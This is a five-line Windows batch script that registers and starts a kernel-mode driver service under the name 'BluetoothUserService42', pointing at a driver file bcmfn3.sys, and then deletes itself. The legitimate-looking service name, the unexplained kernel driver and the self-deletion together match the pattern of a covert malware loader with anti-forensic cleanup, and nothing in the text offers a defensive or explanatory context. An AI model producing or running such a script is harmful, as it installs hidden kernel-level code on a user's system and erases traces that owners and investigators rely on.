@echo off
cd %~dp0
sc create BluetoothUserService42 binpath=C:\Windows\System32\drivers\bcmfn3.sys type=kernel
sc start BluetoothUserService42
del "%~f0"